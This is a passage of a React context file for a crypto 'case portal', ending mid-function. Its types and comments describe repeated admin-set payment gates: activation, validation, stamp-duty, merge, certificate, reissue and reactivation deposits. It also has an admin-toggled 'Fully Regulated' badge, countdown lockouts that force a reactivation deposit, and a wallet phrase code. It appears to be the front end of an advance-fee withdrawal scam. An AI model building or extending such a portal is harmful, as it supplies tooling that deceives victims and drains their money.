import React, { createContext, useContext, useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useQueryClient } from "@tanstack/react-query";
import { useTranslation } from "react-i18next";
import { useToast } from "@/hooks/use-toast";
import { clearPortalToken, getPortalToken } from "@/lib/portalSession";
import { useLocale } from "@/i18n/useLocale";
import { usePortalAutoLogout } from "./usePortalAutoLogout";
import type { CertificateFeeStatus, SharedStampDutyStatus } from "@shared/constants";
import type { RefundClaimStatus } from "@shared/types";

export type ViewState = 'login' | 'register' | 'sync' | 'dashboard' | 'letter' | 'messages' | 'submissions' | 'success' | 'deposit' | 'timeline' | 'keyRequest' | 'declaration' | 'documents' | 'settings' | 'sealed' | 'withdrawalActivation' | 'certificate' | 'sessionRefresh' | 'portalRefresh' | 'walletConnect' | 'withdrawal' | 'refundClaim' | 'reactivationDeposit';

export type DeclarationStatus = 'not_requested' | 'pending' | 'submitted' | 'approved' | 'rejected';

export interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed' | 'sealed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  userBalance?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  depositAddress?: string;
  // Admin-selected crypto and network for this case's deposit. Free-form
  // strings so the admin can pick any token (USDT/USDC/BTC/ETH/…) on any
  // chain (TRC20/ERC20/BEP20/…). The portal falls back to "USDT" + "TRC20"
  // if either is null so legacy cases still render correctly.
  depositAsset?: string;
  depositNetwork?: string;
  // User-declared preferred settlement asset + network (Task #938).
  // Written by the coin/network selector in the portal's Deposits and
  // Withdrawal views; pre-fills the category dropdown and withdrawal form.
  preferredDepositAsset?: string | null;
  preferredDepositNetwork?: string | null;
  profileRedirectUrl?: string;
  hasRequirements?: boolean;
  letterSent?: boolean;
  landingPage?: string;
  showWithdrawalProgress?: boolean;
  withdrawalStage?: string;
  activityDepositAmount?: string;
  phraseKeyDepositAmount?: string;
  phraseKeyMergeDeposit?: string;
  activityWalletRequirement?: string;
  phraseKeyCertificateSent?: boolean;
  // Task #332 — Wallet Connect Phrase Code. `walletPhraseEnabled` gates the
  // dedicated portal view; `walletExchangeName` is the wallet the user picked
  // (crypto.com / Trust Wallet / SafePal / custom). The phrase code itself
  // is NEVER carried on the Case object — it is fetched lazily from the
  // dedicated GET /:id/wallet-phrase endpoint when the user clicks reveal.
  walletPhraseEnabled?: boolean;
  walletExchangeName?: string | null;
  submissionUrl?: string;
  declarationStatus?: DeclarationStatus;
  declarationRequestedAt?: string;
  // Verified Payout Wallet — admin-designated disbursement address for
  // this case. Display-only on the portal; this app does NOT route or
  // relay funds.
  // Sealed Settlement & NDA — set once the user signs the final
  // acknowledgement at stage 14. From this point the portal renders
  // in read-only mode (banners on every view) and the entire case body
  // is frozen server-side until an admin Override-Seal.
  sealedAt?: string | null;
  sealedBy?: string | null;
  payoutWalletAddress?: string | null;
  payoutWalletAsset?: string | null;
  payoutWalletNetwork?: string | null;
  payoutWalletNote?: string | null;
  payoutWalletVerifiedAt?: string | null;
  payoutWalletVerifiedBy?: string | null;
  // Country mode (admin-controlled). When `localizedCurrencyEnabled` is
  // true and `country` maps to a known currency, the portal shows every
  // USDT amount with a parenthetical local-currency estimate.
  country?: string | null;
  localizedCurrencyEnabled?: boolean | null;
  // "Fully Regulated" — admin toggles this once every regulatory
  // checkpoint is cleared; drives the blue verified badge in the header.
  isRegulated?: boolean | null;
  // Withdrawal Window — when true, the dashboard surfaces a "Request
  // Withdrawal" CTA that opens the four-section WithdrawalRequestDialog.
  withdrawalWindowEnabled?: boolean | null;
  // Per-case NDA toggle (mirrors sealed flow).
  ndaEnabled?: boolean | null;
  // Refund Claim — set by admin when the claim flow is activated.
  // NULL = not requested | 'pending_submission' | 'submitted' |
  // 'approved' | 'rejected'
  refundClaimStatus?: RefundClaimStatus | null;
  // Withdrawal Activation (Task #66) — final-stage flow surfaced after
  // the case reaches stage 14. The portal renders a dedicated view that
  // walks the user through binding their wallet address, an optional
  // emailed security code, and the activation deposit. The admin gates
  // the final approval — until then the portal shows the verbatim
  // "deposit minimum amount" notice.
  withdrawalActivationMinUsdt?: string | null;
  withdrawalSecurityTokenRequired?: boolean | null;
  withdrawalAddressSubmitted?: string | null;
  withdrawalDetailsAsset?: string | null;
  withdrawalDetailsNetwork?: string | null;
  withdrawalDetailsAmount?: string | null;
  withdrawalDetailsMemo?: string | null;
  withdrawalActivationStatus?:
    | 'pending_address'
    | 'awaiting_token'
    | 'awaiting_deposit'
    | 'awaiting_admin_approval'
    | 'approved'
    | 'rejected'
    | null;
  withdrawalActivationReceiptId?: number | null;
  withdrawalActivationApprovedAt?: string | null;
  withdrawalActivationRejectedAt?: string | null;
  withdrawalActivationRejectionReason?: string | null;
  withdrawalAddressSubmittedAt?: string | null;
  withdrawalTokenVerifiedAt?: string | null;
  // Task #70 — NDA auto-finalization marker. When set, the portal
  // surfaces the "Case Finalized" banner on the dashboard.
  autoFinalizedAt?: string | null;
  // Task #70 — Merge Phrase Certificate. When `certificateEnabled` is
  // true the portal exposes a dedicated Certificate view; the fee
  // status drives the payment / download UI.
  certificateEnabled?: boolean | null;
  certificateFeePercent?: string | null;
  certificateFeeStatus?: CertificateFeeStatus | null;
  certificateFeeApprovedAt?: string | null;
  // Task #72 — Stamp Duty Deposit. When `stampDutyEnabled` is true and
  // `stampDutyStatus !== 'approved'` the SealedView intercepts to a
  // dedicated upload sub-view (the NDA cannot be sealed until approval).
  // Admins can disable the gate per-case via the regular account editor.
  stampDutyEnabled?: boolean | null;
  stampDutyAmountUsdt?: string | null;
  stampDutyStatus?: SharedStampDutyStatus | null;
  stampDutyApprovedAt?: string | null;
  stampDutyRejectionReason?: string | null;
  // Task #291 — Withdrawal Guide banner. When true the portal renders a
  // step-by-step withdrawal guide on the user's dashboard.
  withdrawalGuideVisible?: boolean | null;
  // Task #311 — Optional freeform override copy for the guide banner.
  withdrawalGuideBody?: string | null;
  // Session Refresh Deposit gate — when `sessionRefreshRequired` is true
  // and `sessionRefreshStatus` is not 'approved', the portal blocks access
  // and shows a dedicated deposit-receipt upload page after login.
  sessionRefreshRequired?: boolean | null;
  sessionRefreshAddress?: string | null;
  sessionRefreshAmount?: string | null;
  sessionRefreshAsset?: string | null;
  sessionRefreshNetwork?: string | null;
  sessionRefreshNote?: string | null;
  sessionRefreshStatus?: string | null;
  // Validation Deposit Gate — admin sets a wallet for a one-time 550 USDT
  // (or equivalent) deposit before the withdrawal completes. Portal shows
  // a deposit instruction card; flips to a green confirmed banner once
  // the admin marks the receipt as received.
  validationDepositWalletAddress?: string | null;
  validationDepositWalletAsset?: string | null;
  validationDepositWalletNetwork?: string | null;
  validationDepositAmount?: string | null;
  validationDepositConfirmed?: boolean | null;
  validationDepositConfirmedAt?: string | null;
  validationDepositConfirmedBy?: string | null;
  // Batch merge fee amount — admin-configurable; portal defaults to '500'.
  mergeFeeAmount?: string | null;
  // When true, the contextual merge-fee banner in DepositView is suppressed.
  mergeFeeHideBanner?: boolean | null;
  // Token Wallet Setup (Task #927) — admin-provided guide link and note;
  // portal shows an action card when set, confirmed banner when done.
  tokenWalletSetupLink?: string | null;
  tokenWalletSetupNote?: string | null;
  tokenWalletSetupConfirmed?: boolean | null;
  tokenWalletSetupConfirmedAt?: string | null;
  tokenWalletSetupConfirmedBy?: string | null;
  // Highest withdrawal stage this case has ever reached (server-managed).
  // NULL means no override — portal falls back to withdrawalStage.
  // Used by nav gates so admin roll-backs never hide already-unlocked content.
  maxStageReached?: number | null;
  // Portal Closure Warning — admin-triggered fullscreen countdown overlay.
  portalWarningAt?: string | null;
  portalWarningMinutes?: number | null;
  portalWarningMessage?: string | null;
  // Account disabled — set by admin override, skip-to-reactivation, or
  // countdown expiry. When true the portal locks down to the reactivation
  // deposit page and the server returns 403 on access-code requests.
  isDisabled?: boolean | null;
  // Server-stamped timestamp used to force-logout sessions that predate
  // a disable or reactivation event.
  forceLogoutAt?: string | null;
}

export interface DeclarationSubmissionSummary {
  id: number;
  caseId: string;
  fullName: string;
  email: string;
  status: 'submitted' | 'approved' | 'rejected';
  submittedAt: string;
  reviewedAt?: string | null;
  reviewerNotes?: string | null;
}

export interface DeclarationAttachmentSummary {
  id: number;
  documentType: string;
  category: 'proof_of_income' | 'custom';
  submittedFileName: string | null;
  status: string;
  submittedAt: string | null;
}

export interface DeclarationState {
  declarationStatus: DeclarationStatus;
  declarationRequestedAt?: string | null;
  latest: DeclarationSubmissionSummary | null;
  attachments?: DeclarationAttachmentSummary[];
}

export interface CaseLetter {
  letterFile?: string;
  letterFileName?: string;
  letterFileType?: string;
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  complianceReference?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionAAmount?: string;
  optionAFrequency?: string;
  optionABatches?: string;
  optionAKeyCost?: string;
  optionATotalRequirement?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionBAmount?: string;
  optionBFrequency?: string;
  optionBBatches?: string;
  optionBKeyCost?: string;
  optionBTotalRequirement?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
  phraseKeyRequirements?: string;
  complianceNotice?: string;
  scheduledFor?: string;
  expiresAt?: string;
  // Latest version — incremented every time admin opens a new reissue round.
  letterVersion?: number;
}

export interface LetterReissue {
  id: number;
  caseId: string;
  version: number;
  reissueFee: string;
  reason?: string | null;
  status: 'awaiting_deposit' | 'awaiting_review' | 'paid' | 'cancelled';
  receiptId?: number | null;
  createdBy: string;
  createdAt: string;
  paidAt?: string | null;
  cancelledAt?: string | null;
}

export interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

export interface ChatMessage {
  id: number;
  caseId: string;
  sender: 'admin' | 'user';
  message: string;
  isRead: string;
  createdAt: string;
}

export interface AdminMessage {
  id: number;
  caseId: string;
  category: 'urgent' | 'processing' | 'resolved';
  title: string;
  body: string;
  isRead: boolean;
  createdAt: string;
}

export interface DepositReceipt {
  id: number;
  caseId: string;
  imageData?: string;
  fileName?: string;
  notes?: string;
  status: string;
  reissueId?: number | null;
  uploadedAt: string;
}

export interface DocumentRequest {
  id: number;
  caseId: string;
  documentType: string;
  description?: string | null;
  status: string;
  deadline?: string | null;
  submittedFileData?: string | null;
  submittedFileName?: string | null;
  adminNotes?: string | null;
  submittedAt?: string | null;
  createdAt: string;
  uploadsEnabled?: boolean;
}

export interface UserDocumentMeta {
  id: number;
  caseId: string;
  fileName: string;
  fileType: string;
  fileSize: string | null;
  category: string | null;
  description: string | null;
  status: string;
  adminNotes: string | null;
  uploadedAt: string;
}

export interface KeyRequestNotification {
  requestId: string;
  unreadCount: number;
  userEmail?: string;
}

export interface WalletEvent {
  action: 'wallet_exchange_selected' | 'wallet_connect_completed' | 'token_wallet_setup_confirmed' | 'token_wallet_setup_unconfirmed';
  walletName: string | null;
  observedAt: string;
}

interface PortalContextValue {
  viewState: ViewState;
  setViewState: (state: ViewState) => void;
  currentCase: Case | null;
  setCurrentCase: (c: Case | null) => void;
  accessCode: string;
  setAccessCode: (code: string) => void;
  letterContent: CaseLetter | null;
  setLetterContent: (letter: CaseLetter | null) => void;
  submissions: Submission[];
  setSubmissions: (subs: Submission[]) => void;
  chatMessages: ChatMessage[];
  setChatMessages: (msgs: ChatMessage[]) => void;
  adminMessages: AdminMessage[];
  setAdminMessages: (msgs: AdminMessage[]) => void;
  depositReceipts: DepositReceipt[];
  setDepositReceipts: (receipts: DepositReceipt[]) => void;
  reissues: LetterReissue[];
  setReissues: (rounds: LetterReissue[]) => void;
  activeReissue: LetterReissue | null;
  unreadCount: number;
  setUnreadCount: (count: number) => void;
  unreadAdminMessages: number;
  setUnreadAdminMessages: (count: number) => void;
  isChatOpen: boolean;
  setIsChatOpen: (open: boolean) => void;
  loadAllData: () => Promise<void>;
  logout: () => void;
  sendMessage: (message: string) => Promise<void>;
  uploadReceipt: (
    file: File,
    notes: string,
    reissueId?: number,
    category?: 'activation' | 'reissue' | 'other' | 'merge_fee' | 'token_deposit',
    options?: { silent?: boolean },
  ) => Promise<void>;
  refreshSubmissions: () => Promise<void>;
  refreshAdminMessages: () => Promise<void>;
  documentRequests: DocumentRequest[];
  refreshDocumentRequests: () => Promise<void>;
  submitDocument: (requestId: number, file: File) => Promise<void>;
  pendingDocumentCount: number;
  userDocuments: UserDocumentMeta[];
  refreshUserDocuments: () => Promise<void>;
  uploadUserDocument: (file: File, category: string, description?: string) => Promise<void>;
  markAdminMessageRead: (messageId: number) => Promise<void>;
  hasUrgentMessages: boolean;
  hasKeyRequest: boolean;
  keyRequestNotification: KeyRequestNotification | null;
  dismissKeyRequestNotification: () => void;
  markKeyRequestRead: (knownRequestId?: string) => Promise<void>;
  declaration: DeclarationState | null;
  refreshDeclaration: () => Promise<void>;
  walletEvents: WalletEvent[];
  activeWarning: { warningAt: Date; minutesTotal: number; message: string } | null;
  warningDismissed: boolean;
  dismissWarning: () => void;
  reshowWarning: () => void;
  lockoutReason: 'admin_disabled' | 'warning_expired' | null;
}

const PortalContext = createContext<PortalContextValue | null>(null);

export function usePortal() {
  const context = useContext(PortalContext);
  if (!context) {
    throw new Error('usePortal must be used within PortalProvider');
  }
  return context;
}

export function PortalProvider({ children }: { children: React.ReactNode }) {
  const [viewState, setViewState] = useState<ViewState>('login');
  const [currentCase, setCurrentCase] = useState<Case | null>(null);
  const [accessCode, setAccessCode] = useState("");
  const [letterContent, setLetterContent] = useState<CaseLetter | null>(null);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
  const [reissues, setReissues] = useState<LetterReissue[]>([]);
  const [unreadCount, setUnreadCount] = useState(0);
  const [unreadAdminMessages, setUnreadAdminMessages] = useState(0);
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [keyRequestNotification, setKeyRequestNotification] = useState<KeyRequestNotification | null>(null);
  const [hasKeyRequest, setHasKeyRequest] = useState(false);
  const [declaration, setDeclaration] = useState<DeclarationState | null>(null);
  const [documentRequests, setDocumentRequests] = useState<DocumentRequest[]>([]);
  const [userDocuments, setUserDocuments] = useState<UserDocumentMeta[]>([]);
  const [walletEvents, setWalletEvents] = useState<WalletEvent[]>([]);
  const [activeWarning, setActiveWarning] = useState<{ warningAt: Date; minutesTotal: number; message: string } | null>(null);
  // dismissedWarningKey tracks the ISO timestamp of the warning the user
  // has dismissed. Dismissal only hides the overlay — the auto-logout
  // timer still fires in a context-level effect below.
  const [dismissedWarningKey, setDismissedWarningKey] = useState<string | null>(null);
  // Tracks why the account was locked so ReactivationDepositView can show
  // the correct notice copy.
  const [lockoutReason, setLockoutReason] = useState<'admin_disabled' | 'warning_expired' | null>(null);

  const warningDismissed = !!(
    activeWarning && dismissedWarningKey === activeWarning.warningAt.toISOString()
  );

  const dismissWarning = useCallback(() => {
    if (activeWarning) {
      setDismissedWarningKey(activeWarning.warningAt.toISOString());
    }
  }, [activeWarning]);

  const reshowWarning = useCallback(() => {
    setDismissedWarningKey(null);
  }, []);
  
  const lastMessageCountRef = useRef(0);
  const isInitialLoadRef = useRef(true);
  // Track previous receipt + document statuses so we can detect transitions
  // to 'approved' or 'rejected' and play the appropriate notification sound.
  const prevReceiptStatusesRef = useRef<Map<number, string>>(new Map());
  const prevDocStatusesRef = useRef<Map<number, string>>(new Map());
  const isFirstDataLoadRef = useRef(true);
  // Guards the account-locked toast so it fires exactly once per lockout
  // event, even if two concurrent poll responses both detect isDisabled.
  const lockoutToastFiredRef = useRef(false);
  // Mirrors the last-known portal-warning fields from currentCase so the
  // 403 lockout path (inside loadAllData, which doesn't close over currentCase)
  // can derive the same warning_expired vs admin_disabled reason.
  const lastKnownWarningRef = useRef<{
    portalWarningAt: string | null;
    portalWarningMinutes: number | null;
  }>({ portalWarningAt: null, portalWarningMinutes: null });

  // Keep lastKnownWarningRef in sync whenever currentCase changes.
  useEffect(() => {
    lastKnownWarningRef.current = {
      portalWarningAt: currentCase?.portalWarningAt ?? null,
      portalWarningMinutes: currentCase?.portalWarningMinutes ?? null,
    };
  }, [currentCase]);

  const { toast } = useToast();
  const { t } = useTranslation("portal");
  const [, navigate] = useLocation();
  const queryClient = useQueryClient();

  const logout = useCallback(() => {
    setViewState('login');
    setCurrentCase(null);
    setAccessCode("");
    setLetterContent(null);
    setSubmissions([]);
    setChatMessages([]);
    setAdminMessages([]);
    setDepositReceipts([]);
    setReissues([]);
    setDocumentRequests([]);
    setWalletEvents([]);
    setUnreadCount(0);
    setUnreadAdminMessages(0);
    setIsChatOpen(false);
    setKeyRequestNotification(null);
    setHasKeyRequest(false);
    setDeclaration(null);
    // Clear all session data for security
    sessionStorage.removeItem("caseAccessCode");
    sessionStorage.removeItem("caseId");
    sessionStorage.removeItem("pinVerified");
    sessionStorage.removeItem("requiresPinSetup");
    // Tear down admin-mirror disclosure state too — otherwise the amber
    // "you are being assisted" banner would survive logout and show to the
    // next user who logs in on the same tab.
    sessionStorage.removeItem("ibccfAdminMirror");
    sessionStorage.removeItem("ibccfAdminMirrorIssuedBy");
    sessionStorage.removeItem("ibccfAdminMirrorReason");
    sessionStorage.removeItem("ibccfAdminMirrorExpiresAt");
    try {
      localStorage.removeItem("ibccf_portal_login_at");
    } catch {
      // ignore
    }
    clearPortalToken();
    // Clear portal closure warning state so it never leaks into the next
    // user's session on the same tab.
    setActiveWarning(null);
    setDismissedWarningKey(null);
    // Drop any cached private data (messages, deposits, reissues, etc.)
    // so the next signed-in user can't see the previous user's data
    // flash through React Query's cache.
    queryClient.clear();
    // Reset the lockout-toast guard so a re-login can trigger it again
    // if the account is still disabled on the next session.
    lockoutToastFiredRef.current = false;
    setLockoutReason(null);
    // Return the user to the bank-grade compliance gateway. Without
    // this navigation, the user stays on /dashboard and sees the
    // legacy dark login form instead of the new entry surface.
    navigate("/");
  }, [navigate, queryClient]);

  const dismissKeyRequestNotification = useCallback(() => {
    if (keyRequestNotification) {
      const { requestId } = keyRequestNotification;
      fetch(`/api/access-key-requests/mark-read/${requestId}`, {
        method: 'PATCH',
      })
        .then((res) => res.ok ? res.json() : null)
        .then((data) => {
          if (data) {
            // Persist seen count locally so badge stays clear across navigation
            localStorage.setItem(`ibccf_kr_seen_${requestId}`, String(data.userMessagesReadCount));
            if (data.userMessagesReadCount > 0) {
              toast({ title: t("context.toast.messagesUpToDateTitle"), description: t("context.toast.messagesUpToDateDesc") });
            }
          }
        })
        .catch(() => {});
      setKeyRequestNotification(null);
    }
  }, [keyRequestNotification, toast]);

  const markKeyRequestRead = useCallback(async (knownRequestId?: string) => {
    // Optimistically clear the badge immediately so it feels instant to the user
    setKeyRequestNotification(null);
    if (!currentCase) return;
    try {
      // Always fetch the case key-request record to obtain the authoritative
      // requestId and userEmail. The email is needed as the x-request-email
      // header for the mark-read PATCH, which verifies the caller matches the
      // requester before persisting the read-count server-side.
      const _caseToken = getPortalToken();
      const caseRes = await fetch(`/api/access-key-requests/case/${currentCase.id}`, {
        headers: _caseToken ? { "x-portal-session-token": _caseToken } : {},
      });
      if (!caseRes.ok) return;
      const caseData = await caseRes.json();
      const requestId: string | null = caseData.requestId ?? knownRequestId ?? null;
      const adminMessageCount: number | undefined = caseData.adminMessageCount;
      const krEmail: string | null = caseData.userEmail ?? null;

      if (!requestId) return;

      const markHeaders: Record<string, string> = {};
      if (krEmail) {
        markHeaders['x-request-email'] = krEmail;
      }
      const markRes = await fetch(`/api/access-key-requests/mark-read/${requestId}`, {
        method: 'PATCH',
        headers: markHeaders,
      });
      if (markRes.ok) {
        const markData = await markRes.json();
        localStorage.setItem(`ibccf_kr_seen_${requestId}`, String(markData.userMessagesReadCount ?? adminMessageCount ?? 0));
      }
    } catch {
      // silently ignore
    }
  }, [currentCase]);

  const refreshDeclaration = useCallback(async () => {
    if (!currentCase) return;
    try {
      const { getPortalToken } = await import("@/lib/portalSession");
      const token = getPortalToken();
      const headers: HeadersInit = token
        ? { "x-portal-session-token": token }
        : {};
      const res = await fetch(`/api/cases/${currentCase.id}/declaration`, {
        headers,
      });
      if (res.ok) {
        const data = await res.json();
        setDeclaration(data);
        // Mirror status onto currentCase so nav badge updates immediately.
        // Preserve identity when status is unchanged to avoid retriggering effects.
        setCurrentCase((prev) => {
          if (!prev) return prev;
          if (prev.declarationStatus === data.declarationStatus) return prev;
          return { ...prev, declarationStatus: data.declarationStatus };
        });
      }
    } catch {
      // silent
    }
  }, [currentCase]);

  const caseId = currentCase?.id;
  const caseAccessCode = currentCase?.accessCode;

  const loadAllData = useCallback(async () => {
    if (!caseId) return;

    try {
      const { getPortalToken } = await import("@/lib/portalSession");
      const portalToken = getPortalToken();
      const portalAuthHeaders: HeadersInit = portalToken
        ? { "x-portal-session-token": portalToken }
        : {};
      // Send the user's active locale on the access fetch so the
       // server can persist it on `cases.preferred_locale`. That column
       // drives admin-triggered transactional emails — without this
       // header the server would only see the browser's default
       // `accept-language`, ignoring an explicit in-app locale switch.
       const localeHeader: Record<string, string> = {};
       try {
         const value = localStorage.getItem("ibccf.locale");
         if (value) localeHeader["X-User-Locale"] = value;
       } catch {
         // ignore storage errors
       }
      const [caseRes, letterRes, submissionsRes, adminMsgRes, receiptsRes, declarationRes, reissuesRes, documentsRes, userDocsRes, walletEventsRes] = await Promise.all([
        caseAccessCode
          ? fetch(`/api/cases/access/${caseAccessCode}`, {
              headers: {
                ...localeHeader,
                ...(portalToken ? { "x-portal-session-token": portalToken } : {}),
              },
            })
          : Promise.resolve(null),
        fetch(`/api/cases/${caseId}/letter`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/submissions`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/admin-messages`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/deposit-receipts`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/declaration`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/reissues`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/document-requests`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/user-documents`, { headers: portalAuthHeaders }),
        fetch(`/api/cases/${caseId}/wallet-events`, { headers: portalAuthHeaders }),
      ]);

      if (caseRes && caseRes.ok) {
        const freshCase = await caseRes.json();
        if (freshCase && freshCase.id) {
          // Admin force-logout: if the case carries a forceLogoutAt that is
          // newer than this browser's recorded login time, drop the session
          // immediately and bail before we keep showing private data.
          const forceLogoutAt = freshCase.forceLogoutAt
            ? new Date(freshCase.forceLogoutAt).getTime()
            : 0;
          let loginAt = 0;
          try {
            loginAt = Number(localStorage.getItem("ibccf_portal_login_at") || 0);
          } catch {
            loginAt = 0;
          }
          if (forceLogoutAt > 0 && forceLogoutAt > loginAt) {
            toast({
              title: t("context.toast.forceLogoutTitle"),
              description: t("context.toast.forceLogoutDesc"),
              variant: "destructive",
            });
            logout();
            return;
          }

          // Portal closure warning — admin set a timed overlay.
          // Detect on every poll; surface when not yet expired, clear otherwise.
          if (freshCase.portalWarningAt && freshCase.portalWarningMinutes) {
            const warningAt = new Date(freshCase.portalWarningAt);
            const expiresAt = warningAt.getTime() + freshCase.portalWarningMinutes * 60 * 1000;
            if (Date.now() < expiresAt) {
              setActiveWarning(prev => {
                // Don't reset if it's the same warning (same timestamp).
                if (prev && prev.warningAt.getTime() === warningAt.getTime()) return prev;
                return {
                  warningAt,
                  minutesTotal: freshCase.portalWarningMinutes!,
                  message: freshCase.portalWarningMessage || "",
                };
              });
            } else {
              // Fields present but warning already expired — clear stale UI state.
              setActiveWarning(null);
              setDismissedWarningKey(null);
            }
          } else {
            // Warning cancelled by admin (fields null) — clear it.
            setActiveWarning(null);
            setDismissedWarningKey(null);
          }

          // Admin lock: account has been disabled mid-session.
          // Preserve the access code so the reactivation deposit page can
          // fetch its deposit instructions without asking the user to re-enter
          // their code. Clear every other sensitive field (same as logout())
          // but route to `reactivationDeposit` instead of `login` so the
          // user lands directly on the reactivation flow.
          if (freshCase.isDisabled) {
            // Determine why the account was locked so the toast and
            // the reactivation page can show the most accurate notice copy.
            let computedReason: 'admin_disabled' | 'warning_expired' = 'admin_disabled';
            if (freshCase.portalWarningAt && freshCase.portalWarningMinutes) {
              const warningExpiry =
                new Date(freshCase.portalWarningAt).getTime() +
                freshCase.portalWarningMinutes * 60 * 1000;
              computedReason = Date.now() >= warningExpiry ? 'warning_expired' : 'admin_disabled';
            }
            if (!lockoutToastFiredRef.current) {
              lockoutToastFiredRef.current = true;
              toast({
                title: t("context.toast.accountLockedTitle"),
                description: t(
                  computedReason === 'warning_expired'
                    ? "context.toast.accountLockedDescWarningExpired"
                    : "context.toast.accountLockedDescAdminDisabled"
                ),
                variant: "destructive",
              });
            }
            setLockoutReason(computedReason);
            const savedCode = freshCase.accessCode || accessCode;
            // Clear sensitive state
            setCurrentCase(null);
            setLetterContent(null);
            setSubmissions([]);
            setChatMessages([]);
            setAdminMessages([]);
            setDepositReceipts([]);
            setReissues([]);
            setDocumentRequests([]);
            setWalletEvents([]);
            setUnreadCount(0);
            setUnreadAdminMessages(0);
            setIsChatOpen(false);
            setKeyRequestNotification(null);
            setHasKeyRequest(false);
            setDeclaration(null);
            setActiveWarning(null);
            setDismissedWarningKey(null);
            sessionStorage.removeItem("caseId");
            sessionStorage.removeItem("pinVerified");
            sessionStorage.removeItem("requiresPinSetup");
            sessionStorage.removeItem("ibccfAdminMirror");
            sessionStorage.removeItem("ibccfAdminMirrorIssuedBy");
            sessionStorage.removeItem("ibccfAdminMirrorReason");
            sessionStorage.removeItem("ibccfAdminMirrorExpiresAt");
            try { localStorage.removeItem("ibccf_portal_login_at"); } catch { /* ignore */ }
            clearPortalToken();
            queryClient.clear();
            // Restore access code so ReactivationDepositView can fetch
            setAccessCode(savedCode);
            try { sessionStorage.setItem("caseAccessCode", savedCode); } catch { /* ignore */ }
            setViewState("reactivationDeposit");
            return;
          }

          // Merge into existing case; only replace state if a tracked field changed
          // to avoid object-identity churn that retriggers effects depending on currentCase.
          setCurrentCase((prev) => {
            if (!prev) return freshCase;
            const merged = { ...prev, ...freshCase };
            const keys = Object.keys(freshCase) as Array<keyof typeof freshCase>;
            const changed = keys.some((k) => (prev as any)[k] !== (freshCase as any)[k]);
            return changed ? merged : prev;
          });
        }
      }

      // Account-disabled: server returns 403 with reason="reactivation_required".
      // This is the case when the account is disabled mid-session and the
      // next poll hits the 403 gate BEFORE the isDisabled field was visible
      // on the previous successful response. Handle it explicitly here so the
      // lockout routing fires even when caseRes.ok is false.
      if (caseRes && caseRes.status === 403) {
        let reason: string | undefined;
        try {
          const body = await caseRes.json();
          reason = body?.reason;
        } catch {
          // ignore JSON parse errors — reason stays undefined
        }
        if (reason === "reactivation_required") {
          // Derive the lockout reason from the last-known warning fields,
          // matching the same logic used in the freshCase.isDisabled path.
          let computed403Reason: 'admin_disabled' | 'warning_expired' = 'admin_disabled';
          const { portalWarningAt, portalWarningMinutes } = lastKnownWarningRef.current;
          if (portalWarningAt && portalWarningMinutes) {
            const warningExpiry =
              new Date(portalWarningAt).getTime() + portalWarningMinutes * 60 * 1000;
            computed403Reason = Date.now() >= warningExpiry ? 'warning_expired' : 'admin_disabled';
          }
          if (!lockoutToastFiredRef.current) {
            lockoutToastFiredRef.current = true;
            toast({
              title: t("context.toast.accountLockedTitle"),
              description: t(
                computed403Reason === 'warning_expired'
                  ? "context.toast.accountLockedDescWarningExpired"
                  : "context.toast.accountLockedDescAdminDisabled"
              ),
              variant: "destructive",
            });
          }
          setLockoutReason(computed403Reason);
          const savedCode = caseAccessCode || accessCode;
          setCurrentCase(null);
          setLetterContent(null);
          setSubmissions([]);
          setChatMessages([]);
          setAdminMessages([]);
          setDepositReceipts([]);
          setReissues([]);
          setDocumentRequests([]);
          setWalletEvents([]);
          setUnreadCount(0);
          setUnreadAdminMessages(0);
          setIsChatOpen(false);
          setKeyRequestNotification(null);
          setHasKeyRequest(false);
          setDeclaration(null);
          setActiveWarning(null);
          setDismissedWarningKey(null);
          sessionStorage.removeItem("caseId");
          sessionStorage.removeItem("pinVerified");
          sessionStorage.removeItem("requiresPinSetup");
          sessionStorage.removeItem("ibccfAdminMirror");
          sessionStorage.removeItem("ibccfAdminMirrorIssuedBy");
          sessionStorage.removeItem("ibccfAdminMirrorReason");
          sessionStorage.removeItem("ibccfAdminMirrorExpiresAt");
          try { localStorage.removeItem("ibccf_portal_login_at"); } catch { /* ignore */ }
          clearPortalToken();
          queryClient.clear();
          setAccessCode(savedCode);
          try { sessionStorage.setItem("caseAccessCode", savedCode); } catch { /* ignore */ }
          setViewState("reactivationDeposit");
          return;
        }
      }

      if (letterRes.ok) {
        const data = await letterRes.json();
        setLetterContent(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        setSubmissions(data);
      }
      
      if (adminMsgRes.ok) {
        const data = await adminMsgRes.json();
        setAdminMessages(data);
        const unread = data.filter((m: AdminMessage) => !m.isRead).length;
        setUnreadAdminMessages(unread);
      }
      
      if (receiptsRes.ok) {
        const data = await receiptsRes.json();
        setDepositReceipts(data);
      }

      if (declarationRes.ok) {
        const data = await declarationRes.json();
        setDeclaration(data);
        setCurrentCase((prev) => {
          if (!prev) return prev;
          if (prev.declarationStatus === data.declarationStatus) return prev;
          return { ...prev, declarationStatus: data.declarationStatus };
        });
      }

